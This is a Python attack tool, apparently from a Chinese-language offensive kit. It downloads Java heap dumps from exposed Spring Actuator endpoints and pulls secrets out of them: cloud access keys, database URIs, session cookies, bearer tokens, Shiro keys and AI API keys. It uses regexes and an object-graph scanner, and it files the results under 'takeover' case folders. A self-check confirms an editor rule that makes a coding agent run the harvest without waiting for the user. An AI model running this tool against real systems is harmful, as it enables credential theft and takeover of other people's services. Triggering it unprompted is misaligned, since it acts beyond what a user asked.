#!/usr/bin/env python3
"""heapdump 抽凭据：字节正则 + 蓝鸟猎手（JDumpSpider）对象图。

对齐 Playbook：传承/开棺·蓝鸟.md
上游：春府·开棺.md

用法:
  python3 炼蛊房/heap_cred_scan.py <dump.hprof> --out 接管/heap_creds/ [--case 案卷]
  python3 炼蛊房/heap_cred_scan.py spider --dump <hprof> --out ...
  python3 炼蛊房/heap_cred_scan.py batch --dir <目录> --out ...
  python3 炼蛊房/heap_cred_scan.py from-probe --probe 案卷/actuator/probe.json \\
      --dump-dir 案卷/heapdump --out 接管/heap_creds --case <案>
  python3 炼蛊房/heap_cred_scan.py doctor
"""
from __future__ import annotations

import argparse
import json
import os
import re
import shutil
import subprocess
import sys
from collections import Counter
from datetime import datetime, UTC
from pathlib import Path
from typing import Any

OPS = Path(__file__).resolve().parent
ENGINE = (OPS.parent if (OPS.parent / "杀招").is_dir() else (OPS.parent if (OPS.parent / "杀招").is_dir() else OPS.parents[1]))
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))
from scope_lib import host_of, in_scope, write_probe_json  # noqa: E402

HUNTER_DIR = ENGINE / "tools" / "heap-hunter"
JAR = HUNTER_DIR / "lanniao-hunter.jar"
SPIDERS_JSON = HUNTER_DIR / "spiders.json"
PLAYBOOK = "传承/开棺·蓝鸟.md"
# HunterLauncher 是 classfile 70（Java 26）。batch 走 Main，JDK 17 即可。
HEAP_EXTS = {".hprof", ".phd", ".heap", ".bin"}

PATTERNS: list[tuple[str, re.Pattern[bytes]]] = [
    ("aliyun_ak", re.compile(rb"LTAI[A-Za-z0-9]{12,24}")),
    ("aliyun_sk_near", re.compile(rb"(?i)(accesskeysecret|secretkey|access_key_secret)[=:\"'\s]{0,8}([A-Za-z0-9/+]{20,50})")),
    ("jdbc", re.compile(rb"jdbc:(mysql|postgresql|mariadb|oracle|sqlserver)://[^\x00-\x1f\"'\\ ]{8,200}")),
    ("redis_uri", re.compile(rb"redis://[^\x00-\x1f\"'\\ ]{3,120}")),
    ("mongo_uri", re.compile(rb"mongodb(\+srv)?://[^\x00-\x1f\"'\\ ]{8,200}")),
    ("amqp", re.compile(rb"amqps?://[^\x00-\x1f\"'\\ ]{8,160}")),
    ("rsa_pem", re.compile(rb"-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY-----")),
    ("enc_jasypt", re.compile(rb"ENC\([A-Za-z0-9+/=]{8,}\)")),
    ("bearer", re.compile(rb"Bearer [A-Za-z0-9._\-]{20,}")),
    ("password_kv", re.compile(rb"(?i)(password|passwd|pwd)\s*[=:]\s*[^\x00-\x1f\"'\\ ]{3,64}")),
    ("cookie_header", re.compile(rb"(?i)Cookie:\s*[^\x00-\x1f]{8,400}")),
    ("authorization_header", re.compile(rb"(?i)Authorization:\s*[^\x00-\x1f]{8,300}")),
    ("shiro_remember", re.compile(rb"rememberMe=[A-Za-z0-9+/=_-]{16,}")),
    ("jasypt_pass", re.compile(rb"jasypt\.encryptor\.password[=:][^\x00-\x1f\"'\\ ]{1,80}")),
    ("tencent_akid", re.compile(rb"AKID[A-Za-z0-9]{16,32}")),
    ("openai_sk", re.compile(rb"sk-proj-[A-Za-z0-9_-]{20,}")),
    ("anthropic_sk", re.compile(rb"sk-ant-[A-Za-z0-9_-]{20,}")),
    ("google_ai", re.compile(rb"AIzaSy[A-Za-z0-9_-]{33}")),
    ("shiro_known", re.compile(rb"(kPH\+[A-Za-z0-9+/=]{20,}|4AvVhmFLUs0KTA3Kprsdag==)")),
]

UTF16_NEEDLES = [
    "LTAI5t",
    "jdbc:mysql",
    "AccessKey",
    "secretKey",
    "spring.datasource",
    "spring.redis",
    "jasypt.encryptor",
    "CookieRememberMeManager",
    "encryptionCipherKey",
    "ProcessEnvironment",
    "OriginTrackedMapPropertySource",
    "DruidDataSourceWrapper",
    "RedisStandaloneConfiguration",
    "admin@123",
    "sk-ant-",
    "sk-proj-",
    "AKID",
    "AIzaSy",
]


def _now() -> str:
    return datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%SZ")


def assert_url_in_scope(url: str) -> None:
    host = host_of(url)
    if host and not in_scope(host):
        raise SystemExit(f"[scope] {host} 不在授权范围")


def load_spiders() -> dict[str, Any]:
    return json.loads(SPIDERS_JSON.read_text(encoding="utf-8"))


def spider_needles(catalog: dict[str, Any]) -> list[bytes]:
    out: list[bytes] = []
    for sp in catalog.get("spiders") or []:
        if sp.get("optional"):
            continue
        for key in ("target", "title"):
            val = str(sp.get(key) or "")
            if val and not val.startswith("*") and len(val) >= 8:
                out.append(val.encode("ascii", "ignore"))
        for f in sp.get("fields") or []:
            if len(str(f)) >= 8:
                out.append(str(f).encode("ascii", "ignore"))
    extra = [
        b"DataSourceProperties",
        b"password.thePassword",
        b"encryptionCipherKey",
        b"ConsulPropertySource",
        b"MutablePropertySources",
    ]
    seen: set[bytes] = set()
    merged: list[bytes] = []
    for n in out + extra:
        if n and n not in seen:
            seen.add(n)
            merged.append(n)
    return merged


def scan_ascii(blob: bytes, max_per: int) -> dict[str, list[str]]:
    out: dict[str, list[str]] = {}
    for name, rx in PATTERNS:
        hits: list[str] = []
        for m in rx.finditer(blob):
            s = m.group(0).decode("latin1", "replace")
            if s not in hits:
                hits.append(s)
            if len(hits) >= max_per:
                break
        if hits:
            out[name] = hits
    return out


def scan_utf16(blob: bytes, max_hits: int) -> list[str]:
    hits: list[str] = []
    for needle in UTF16_NEEDLES:
        for enc, label in (("utf-16le", "LE"), ("utf-16be", "BE")):
            nb = needle.encode(enc)
            start = 0
            while True:
                i = blob.find(nb, start)
                if i < 0:
                    break
                a = max(0, i - 80)
                b = min(len(blob), i + 160)
                chunk = blob[a:b]
                try:
                    text = chunk.decode(enc, "ignore")
                except Exception:  # noqa: BLE001
                    text = ""
                text = "".join(
                    c if 32 <= ord(c) < 127 or "\u4e00" <= c <= "\u9fff" else "."
                    for c in text
                )
                hits.append(f"utf16{label}@{i}: {text[:160]}")
                start = i + len(nb)
                if len(hits) >= max_hits:
                    return hits
    return hits


def scan_needles(blob: bytes, needles: list[bytes], max_per: int) -> dict[str, list[str]]:
    hits: dict[str, list[str]] = {}
    for nb in needles:
        if not nb:
            continue
        start = 0
        name = nb.decode("latin1", "replace")
        found: list[str] = []
        while True:
            i = blob.find(nb, start)
            if i < 0:
                break
            a = max(0, i - 40)
            b = min(len(blob), i + 80)
            window = "".join(chr(c) if 32 <= c < 127 else "." for c in blob[a:b])
            found.append(f"@{i}: {window[:140]}")
            start = i + len(nb)
            if len(found) >= max_per:
                break
        if found:
            hits[name] = found
    return hits


def regex_scan(path: Path, max_per: int, chunk_mb: int, catalog: dict[str, Any]) -> dict[str, Any]:
    merged: dict[str, list[str]] = {}
    utf16_all: list[str] = []
    class_hits: dict[str, list[str]] = {}
    counts: Counter[str] = Counter()
    needles = spider_needles(catalog)
    chunk = chunk_mb * 1024 * 1024
    with path.open("rb") as f:
        prev = b""
        while True:
            data = f.read(chunk)
            if not data:
                break
            window = prev + data
            part = scan_ascii(window, max_per)
            for k, vs in part.items():
                bucket = merged.setdefault(k, [])
                for v in vs:
                    if v not in bucket and len(bucket) < max_per:
                        bucket.append(v)
                        counts[k] += 1
            if len(utf16_all) < max_per:
                utf16_all.extend(scan_utf16(window, max_per - len(utf16_all)))
            extra = scan_needles(window, needles, 3)
            for k, vs in extra.items():
                bucket = class_hits.setdefault(k, [])
                for v in vs:
                    if v not in bucket and len(bucket) < 6:
                        bucket.append(v)
            prev = data[-4096:]
    return {
        "hits": merged,
        "counts": dict(counts),
        "utf16_windows": utf16_all[:max_per],
        "spider_class_hits": class_hits,
    }


def resolve_java() -> str | None:
    cands: list[Path] = []
    vendor = ENGINE / "tools" / "spring-gateway-killchain" / "vendor"
    if vendor.is_dir():
        cands.extend(sorted(vendor.glob("jdk-*/bin/java")))
        cands.extend(sorted(vendor.glob("jdk-*/Contents/Home/bin/java")))
    home = os.environ.get("JAVA_HOME")
    if home:
        cands.append(Path(home) / "bin" / "java")
    which = shutil.which("java")
    if which:
        cands.append(Path(which))
    for c in cands:
        if not c.is_file():
            continue
        try:
            r = subprocess.run(
                [str(c), "-version"], capture_output=True, timeout=8, check=False
            )
        except (OSError, subprocess.TimeoutExpired):
            continue
        text = (r.stderr + r.stdout).decode("utf-8", "replace")
        if "Unable to locate a Java Runtime" in text:
            continue
        if "version" in text.lower() or r.returncode == 0:
            return str(c)
    return None


JAR_FAIL_MARKS = (
    "file not exist",
    "please give a heap",
    "file too short",
    "exception in thread",
    "cannot determine total",
)


def heapdump_url_from_probe(probe: dict[str, Any]) -> str:
    for row in probe.get("results") or []:
        if "heapdump" not in str(row.get("path") or row.get("url") or ""):
            continue
        cands = [
            row.get("status"),
            (row.get("head") or {}).get("status"),
            (row.get("range_1k") or {}).get("status"),
        ]
        for st in cands:
            try:
                if st is not None and int(st) < 400:
                    return str(row.get("url") or "")
            except (TypeError, ValueError):
                continue
    return ""


def probe_heapdump_exposed(probe: dict[str, Any]) -> bool:
    if probe.get("heapdump_exposed"):
        return True
    return bool(heapdump_url_from_probe(probe))


def parse_spider_text(text: str) -> dict[str, str]:
    sections: dict[str, str] = {}
    cur = "preamble"
    buf: list[str] = []
    for line in text.splitlines():
        if line.startswith("==========================================="):
            if buf and cur:
                sections[cur] = "\n".join(buf).strip()
            buf = []
            cur = ""
            continue
        if not cur and line.strip():
            cur = line.strip()
            continue
        if line.strip() == "-------------":
            continue
        if cur:
            buf.append(line)
    if buf and cur:
        sections[cur] = "\n".join(buf).strip()
    return {
        k: v
        for k, v in sections.items()
        if v and not v.lower().strip().startswith("not found")
    }


def run_jar(dump: Path, out_txt: Path, java: str) -> dict[str, Any]:
    """同步跑 Main（不传 -out）。JAR 对坏堆也常 exit 0，不能只看 returncode。"""
    out_txt.parent.mkdir(parents=True, exist_ok=True)
    cmd = [java, "-jar", str(JAR), str(dump)]
    try:
        r = subprocess.run(
            cmd, capture_output=True, timeout=900, check=False, cwd=str(HUNTER_DIR)
        )
    except subprocess.TimeoutExpired:
        return {"ok": False, "error": "timeout", "cmd": cmd}
    stdout = (r.stdout or b"").decode("utf-8", "replace")
    stderr = (r.stderr or b"").decode("utf-8", "replace")
    text = "\n".join(x for x in (stdout, stderr) if x).strip()
    out_txt.write_text(text + "\n", encoding="utf-8")
    low = text.lower()
    failed = any(m in low for m in JAR_FAIL_MARKS)
    sections = parse_spider_text(stdout or text)
    ok = (not failed) and bool(sections or "====" in text)
    return {
        "ok": ok,
        "returncode": r.returncode,
        "cmd": cmd,
        "stderr": stderr[-2000:],
        "sections": sections,
        "report": str(out_txt),
        "bytes": len(text),
    }


def write_report(
    out: Path,
    path: Path,
    regex: dict[str, Any],
    spider: dict[str, Any] | None,
    *,
    case: str = "",
    archive: bool = True,
) -> dict[str, Any]:
    out.mkdir(parents=True, exist_ok=True)
    merged = regex.get("hits") or {}
    counts = dict(regex.get("counts") or {})
    report = {
        "generated_at": datetime.now(UTC).isoformat(),
        "ts": _now(),
        "source": str(path),
        "size_bytes": path.stat().st_size,
        "counts": counts,
        "hits": merged,
        "utf16_windows": regex.get("utf16_windows") or [],
        "spider_class_hits": regex.get("spider_class_hits") or {},
        "spider": spider or {"ran": False},
        "playbook": PLAYBOOK,
        "upstream": "传承/春府·开棺.md",
    }
    (out / "HEAP_CREDS.json").write_text(
        json.dumps(report, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    lines = [
        f"# Heap Cred Scan — `{path.name}`",
        "",
        f"- size: {report['size_bytes']}",
        f"- categories: {', '.join(f'{k}={v}' for k, v in counts.items()) or '无'}",
        f"- spider: {'ran' if (spider or {}).get('ok') else 'skip/fail'}",
        "",
        "## Aliyun AK 候选",
        "",
    ]
    for ak in merged.get("aliyun_ak", [])[:20]:
        lines.append(f"- `{ak}`")
    lines += ["", "## JDBC", ""]
    for j in merged.get("jdbc", [])[:20]:
        lines.append(f"- `{j}`")
    lines += ["", "## 蓝鸟蜘蛛", ""]
    sections = (spider or {}).get("sections") or {}
    if sections:
        for name, body in sections.items():
            lines.append(f"### {name}")
            lines.append("")
            lines.append("```")
            lines.append(body[:4000])
            lines.append("```")
            lines.append("")
    elif regex.get("spider_class_hits"):
        lines.append("对象图未跑（无 Java 或失败）。类名指纹：")
        lines.append("")
        for k in sorted(regex["spider_class_hits"])[:20]:
            lines.append(f"- `{k}`")
        lines.append("")
    else:
        lines.append("无蜘蛛命中。")
        lines.append("")
    lines += ["完整 JSON：`HEAP_CREDS.json`", ""]
    (out / "HEAP_CREDS.md").write_text("\n".join(lines), encoding="utf-8")
    if case and archive:
        write_probe_json(
            report, case=case, case_subdir="heap_creds", filename="HEAP_CREDS.json"
        )
    return report


def analyze_one(
    dump: Path,
    out: Path,
    *,
    max_per: int,
    chunk_mb: int,
    no_jar: bool,
    jar_only: bool,
    case: str = "",
    archive: bool = True,
) -> dict[str, Any]:
    if not dump.is_file():
        raise FileNotFoundError(dump)
    catalog = load_spiders()
    regex: dict[str, Any] = {"hits": {}, "counts": {}, "utf16_windows": [], "spider_class_hits": {}}
    if not jar_only:
        regex = regex_scan(dump, max_per, chunk_mb, catalog)
    spider: dict[str, Any] = {"ran": False}
    if not no_jar and JAR.is_file():
        java = resolve_java()
        if java:
            spider = run_jar(dump, out / "JDDUMP_SPIDER.txt", java)
            spider["ran"] = True
            spider["java"] = java
        else:
            spider = {"ran": False, "reason": "no-java"}
    elif not JAR.is_file():
        spider = {"ran": False, "reason": "no-jar"}
    report = write_report(out, dump, regex, spider, case=case, archive=archive)
    return report


def cmd_doctor() -> int:
    checks: list[tuple[str, bool, str]] = []

    def add(name: str, ok: bool, detail: str) -> None:
        checks.append((name, ok, detail))
        print(f"[{'OK' if ok else 'FAIL'}] {name}: {detail}")

    add("jar", JAR.is_file() and JAR.stat().st_size > 100_000, str(JAR))
    add("spiders-json", SPIDERS_JSON.is_file(), str(SPIDERS_JSON))
    catalog = load_spiders() if SPIDERS_JSON.is_file() else {}
    ids = [s["id"] for s in catalog.get("spiders") or []]
    need = {
        "DataSource01", "DataSource04", "Redis01", "ShiroKey01",
        "EnvProperty01", "OSS01", "CookieThief", "AuthThief", "UserPassSearcher01",
    }
    add("spider-count", len(ids) >= 17, str(len(ids)))
    add("spider-core", need <= set(ids), str(sorted(need - set(ids))))
    add("playbook", (ENGINE / PLAYBOOK).is_file(), PLAYBOOK)
    add("skill", (ENGINE / "杀招/开棺·蓝鸟/SKILL.md").is_file(), "skill")
    add("no-export-default", not any(
        (s.get("id") == "ExportAllString" and not s.get("optional"))
        for s in catalog.get("spiders") or []
    ), "export optional")
    blob = (
        b"LTAI5tTESTKEY123456 jdbc:mysql://127.0.0.1:3306/db "
        b"Cookie: wt=abc123remember "
        b"Authorization: Bearer aaaa.bbbb.cccc "
        b"org.springframework.boot.autoconfigure.jdbc.DataSourceProperties "
        b"org.apache.shiro.web.mgt.CookieRememberMeManager "
        b"encryptionCipherKey password.thePassword "
        b"ENC(abcdEFGH1234) "
    )
    ascii_hits = scan_ascii(blob, 10)
    add("regex-ak", bool(ascii_hits.get("aliyun_ak")), str(ascii_hits.get("aliyun_ak")))
    add("regex-jdbc", bool(ascii_hits.get("jdbc")), "jdbc")
    add("regex-cookie", bool(ascii_hits.get("cookie_header")), "cookie")
    add("regex-shiro-class", b"CookieRememberMeManager" in blob, "class needle")
    class_hits = scan_needles(blob, spider_needles(catalog), 3)
    add("regex-datasource-class", any("DataSourceProperties" in k for k in class_hits), str(list(class_hits)[:4]))
    parsed = parse_spider_text(
        "===========================================\n"
        "SpringDataSourceProperties\n"
        "-------------\n"
        "url = jdbc:mysql://x\n"
        "username = root\n"
        "===========================================\n"
        "CookieThief\n"
        "-------------\n"
        "not found!\n"
    )
    add("parse-spider", parsed.get("SpringDataSourceProperties", "").startswith("url"), str(parsed))
    add("parse-skip-empty", "CookieThief" not in parsed, "skip not found")
    sample = Path("/tmp/se-heap-hunter-sample.bin")
    sample.write_bytes(blob + "DataSourceProperties".encode("utf-16le"))
    dest = Path("/tmp/se-heap-hunter-out")
    if dest.exists():
        shutil.rmtree(dest)
    report = analyze_one(sample, dest, max_per=10, chunk_mb=1, no_jar=True, jar_only=False)
    add("scan-writes", (dest / "HEAP_CREDS.json").is_file(), "json")
    add("scan-md", (dest / "HEAP_CREDS.md").is_file(), "md")
    add("scan-ak", bool((report.get("hits") or {}).get("aliyun_ak")), "ak in report")
    add("no-default-c2", "attacker.com" not in json.dumps(report), "no c2")
    java = resolve_java()
    add("java-optional", True, java or "regex-only fallback")
    fetch_py = ENGINE / "tools" / "spring-gateway-killchain" / "bin" / "heapdump_range_fetch.py"
    fetch_src = fetch_py.read_text(encoding="utf-8") if fetch_py.is_file() else ""
    add("range-fetch-autoscan", "heap_cred_scan.py" in fetch_src and "no-scan" in fetch_src, "fetch→scan")
    kit_src = (ENGINE / "炼蛊房" / "kit_run.py").read_text(encoding="utf-8")
    add("kit-run-splits", "_split_heapdump" in kit_src and "heap_cred_scan.py" in kit_src, "kit java 真拆")
    camp = (ENGINE / "炼蛊房" / "auto_campaign.py").read_text(encoding="utf-8")
    add("campaign-heap", '"id": "heap_cred_scan"' in camp, "auto_campaign 菜单")
    sgc = (ENGINE / "tools" / "spring-gateway-killchain" / "bin" / "sgc_probe.py").read_text(encoding="utf-8")
    add("sgc-heapdump", "/actuator/heapdump" in sgc, "sgc 探堆")
    rule = (ENGINE / ".cursor" / "rules" / "spring-gateway-actuator-killchain.mdc").read_text(encoding="utf-8")
    add("rule-must-split", "heap_cred_scan" in rule and "不等用户说" in rule, "always-apply")
    probe_head405 = {
        "heapdump_exposed": False,
        "results": [{
            "path": "/actuator/heapdump",
            "url": "https://x/actuator/heapdump",
            "head": {"status": 405},
            "range_1k": {"status": 206},
        }],
    }
    add(
        "probe-range-not-just-head",
        heapdump_url_from_probe(probe_head405).endswith("heapdump"),
        heapdump_url_from_probe(probe_head405),
    )
    add(
        "jar-fail-not-ok",
        any(m in "exception in thread\nfile too short" for m in JAR_FAIL_MARKS),
        "fail marks",
    )
    parsed2 = parse_spider_text(
        "===========================================\nX\n-------------\nurl = jdbc://x not found host\n"
    )
    add("parse-keep-notfound-in-value", "X" in parsed2, str(parsed2))
    camp_heap = next(
        (b for b in camp.split("{") if '"id": "heap_cred_scan"' in b or '"id": "heap_cred_scan"' in camp),
        camp,
    )
    add("campaign-after-actuator", '"priority": 2' in camp and "from-probe" in camp, "prio2 from-probe")
    sgc_ok = "bytes=0-1023" in sgc and "content_range" in sgc
    add("sgc-range-1k", sgc_ok, "Range 0-1023")
    kit2 = (ENGINE / "炼蛊房" / "kit_run.py").read_text(encoding="utf-8")
    add("kit-from-probe", "from-probe" in kit2, "kit uses from-probe")
    routing_path = ENGINE / "炼蛊房" / "reverse_routing.json"
    routing = json.loads(routing_path.read_text(encoding="utf-8")) if routing_path.is_file() else {}
    se27 = (routing.get("routes") or {}).get("SE27") or {}
    pri = list(routing.get("priority") or [])
    add("route-se27", se27.get("skill") == "heapdump-lanniao-hunter", "SE27")
    add(
        "route-se27-before-se08",
        "SE27" in pri and "SE08" in pri and pri.index("SE27") < pri.index("SE08"),
        "prio",
    )
    se08_kw = json.dumps((routing.get("routes") or {}).get("SE08") or {}, ensure_ascii=False)
    add("se08-no-lanniao", "蓝鸟猎手" not in se08_kw and "jdumpspider" not in se08_kw.lower(), "se08")
    add("range-fetch-scope", "in_scope" in fetch_src, "fetch scope")
    self_src = Path(__file__).read_text(encoding="utf-8")
    add("scan-has-case", "--case" in self_src and "write_probe_json" in self_src, "case archive")
    add("scan-from-probe-scope", "assert_url_in_scope" in self_src, "from-probe scope")
    if java and JAR.is_file():
        fake = Path("/tmp/se-heap-too-short.hprof")
        fake.write_bytes(b"JAVA PROFILE 1.0.2\x00\x00")
        jar_ret = run_jar(fake, Path("/tmp/se-heap-too-short.txt"), java)
        add("jar-short-not-ok", not jar_ret.get("ok"), str(jar_ret.get("ok")))
    else:
        add("jar-short-not-ok", True, "skip-no-java")
    failed = [c for c in checks if not c[1]]
    print(f"doctor {len(checks) - len(failed)}/{len(checks)}")
    return 1 if failed else 0


def _iter_heaps(root: Path) -> list[Path]:
    out: list[Path] = []
    if not root.is_dir():
        return out
    for p in root.rglob("*"):
        if p.is_file() and p.suffix.lower() in HEAP_EXTS:
            if "_hunter_reports" in p.parts or "_creds" in p.parts:
                continue
            if p.stat().st_size < 64:
                continue
            out.append(p)
    return sorted(out)


def run_batch(
    root: Path,
    dest: Path,
    *,
    max_per: int = 40,
    chunk_mb: int = 64,
    no_jar: bool = False,
    case: str = "",
) -> dict[str, Any]:
    dest.mkdir(parents=True, exist_ok=True)
    files = _iter_heaps(root)
    rows = []
    for dump in files:
        sub_out = dest / dump.stem
        report = analyze_one(
            dump,
            sub_out,
            max_per=max_per,
            chunk_mb=chunk_mb,
            no_jar=no_jar,
            jar_only=False,
            case=case,
            archive=False,
        )
        rows.append({"dump": str(dump), "out": str(sub_out), "counts": report.get("counts")})
    merged_hits: dict[str, list[str]] = {}
    for row in rows:
        child = Path(row["out"]) / "HEAP_CREDS.json"
        if not child.is_file():
            continue
        part = json.loads(child.read_text(encoding="utf-8"))
        for k, vs in (part.get("hits") or {}).items():
            bucket = merged_hits.setdefault(k, [])
            for v in vs:
                if v not in bucket:
                    bucket.append(v)
    summary = {
        "ts": _now(),
        "n": len(rows),
        "rows": rows,
        "hits": merged_hits,
        "playbook": PLAYBOOK,
    }
    (dest / "BATCH.json").write_text(json.dumps(summary, ensure_ascii=False, indent=2), encoding="utf-8")
    merged_report = {
        "ts": _now(),
        "playbook": PLAYBOOK,
        "n": len(rows),
        "counts": {k: len(v) for k, v in merged_hits.items()},
        "hits": merged_hits,
        "rows": rows,
    }
    (dest / "HEAP_CREDS.json").write_text(
        json.dumps(merged_report, ensure_ascii=False, indent=2),
        encoding="utf-8",
    )
    if case:
        write_probe_json(
            merged_report, case=case, case_subdir="heap_creds", filename="HEAP_CREDS.json"
        )
    return summary


def cmd_from_probe(args: argparse.Namespace) -> int:
    """读 actuator probe.json：可达则 Range 下堆，再 batch 拆。"""
    dump_dir = Path(args.dump_dir).expanduser().resolve()
    cred_dir = Path(args.out).expanduser().resolve()
    probe: dict[str, Any] = {}
    if args.probe:
        pp = Path(args.probe).expanduser()
        if pp.is_file():
            probe = json.loads(pp.read_text(encoding="utf-8"))
    dump_dir.mkdir(parents=True, exist_ok=True)
    files = _iter_heaps(dump_dir)
    url = heapdump_url_from_probe(probe)
    exposed = probe_heapdump_exposed(probe)
    if not files and url:
        assert_url_in_scope(url)
        fetch_py = ENGINE / "tools" / "spring-gateway-killchain" / "bin" / "heapdump_range_fetch.py"
        r = subprocess.run(
            [
                sys.executable, str(fetch_py),
                "--url", url,
                "--out", str(dump_dir) + "/",
                "--no-scan",
            ],
            check=False,
        )
        if r.returncode != 0:
            print(json.dumps({"ok": False, "reason": "fetch-fail", "url": url, "rc": r.returncode}))
            return 2
        files = _iter_heaps(dump_dir)
    if not files:
        print(json.dumps({"ok": False, "reason": "no-dump", "exposed": exposed, "url": url}))
        return 0 if not exposed else 2
    summary = run_batch(
        dump_dir,
        cred_dir,
        max_per=args.max_per,
        chunk_mb=args.chunk_mb,
        no_jar=args.no_jar,
        case=getattr(args, "case", "") or "",
    )
    print(json.dumps({"ok": True, "n": summary.get("n"), "out": str(cred_dir)}, ensure_ascii=False))
    return 0


def main() -> int:
    raw = sys.argv[1:]
    if raw and raw[0] in {"doctor", "spider", "batch", "scan", "from-probe"}:
        ap = argparse.ArgumentParser(description="heapdump 正则 + 蓝鸟猎手")
        sub = ap.add_subparsers(dest="cmd", required=True)
        sub.add_parser("doctor")
        sc = sub.add_parser("scan")
        sc.add_argument("--dump", required=True)
        sc.add_argument("--out", required=True)
        sc.add_argument("--chunk-mb", type=int, default=64)
        sc.add_argument("--max-per", type=int, default=40)
        sc.add_argument("--no-jar", action="store_true")
        sc.add_argument("--case", default="")
        sp = sub.add_parser("spider")
        sp.add_argument("--dump", required=True)
        sp.add_argument("--out", required=True)
        sp.add_argument("--case", default="")
        bt = sub.add_parser("batch")
        bt.add_argument("--dir", required=True)
        bt.add_argument("--out", required=True)
        bt.add_argument("--chunk-mb", type=int, default=64)
        bt.add_argument("--max-per", type=int, default=40)
        bt.add_argument("--no-jar", action="store_true")
        bt.add_argument("--case", default="")
        fp = sub.add_parser("from-probe", help="读 probe.json，可达则下堆并拆")
        fp.add_argument("--probe", default="", help="actuator probe.json")
        fp.add_argument("--dump-dir", required=True)
        fp.add_argument("--out", required=True)
        fp.add_argument("--chunk-mb", type=int, default=64)
        fp.add_argument("--max-per", type=int, default=40)
        fp.add_argument("--no-jar", action="store_true")
        fp.add_argument("--case", default="")
        args = ap.parse_args()
        if args.cmd == "doctor":
            return cmd_doctor()
        if args.cmd == "spider":
            dump = Path(args.dump).expanduser().resolve()
            out = Path(args.out).expanduser().resolve()
            report = analyze_one(
                dump,
                out,
                max_per=40,
                chunk_mb=64,
                no_jar=False,
                jar_only=True,
                case=getattr(args, "case", "") or "",
            )
            print(json.dumps(
                {"out": str(out), "spider": report.get("spider"), "counts": report.get("counts")},
                ensure_ascii=False,
            ))
            return 0 if (report.get("spider") or {}).get("ok") or (report.get("spider") or {}).get("reason") else 1
        if args.cmd == "from-probe":
            return cmd_from_probe(args)
        if args.cmd == "batch":
            summary = run_batch(
                Path(args.dir).expanduser().resolve(),
                Path(args.out).expanduser().resolve(),
                max_per=args.max_per,
                chunk_mb=args.chunk_mb,
                no_jar=args.no_jar,
                case=getattr(args, "case", "") or "",
            )
            print(json.dumps(summary, ensure_ascii=False, indent=2))
            return 0
        dump = Path(args.dump).expanduser().resolve()
        out = Path(args.out).expanduser().resolve()
        report = analyze_one(
            dump,
            out,
            max_per=args.max_per,
            chunk_mb=args.chunk_mb,
            no_jar=args.no_jar,
            jar_only=False,
            case=getattr(args, "case", "") or "",
        )
        print(json.dumps(
            {"out": str(out), "counts": report.get("counts"), "spider": (report.get("spider") or {}).get("ok")},
            ensure_ascii=False,
        ))
        return 0

    ap = argparse.ArgumentParser()
    ap.add_argument("dump", help="hprof / heapdump.bin / 任意二进制")
    ap.add_argument("--out", required=True)
    ap.add_argument("--chunk-mb", type=int, default=64)
    ap.add_argument("--max-per", type=int, default=40)
    ap.add_argument("--no-jar", action="store_true", help="只跑正则，不调蓝鸟 JAR")
    ap.add_argument("--case", default="", help="写入案卷 案卷/heap_creds/")
    args = ap.parse_args()
    path = Path(args.dump)
    if not path.is_file():
        raise SystemExit(f"missing {path}")
    report = analyze_one(
        path,
        Path(args.out),
        max_per=args.max_per,
        chunk_mb=args.chunk_mb,
        no_jar=args.no_jar,
        jar_only=False,
        case=args.case or "",
    )
    print(json.dumps(
        {"out": args.out, "counts": report.get("counts"), "spider": (report.get("spider") or {}).get("ok")},
        ensure_ascii=False,
    ))
    return 0


if __name__ == "__main__":
    sys.exit(main())
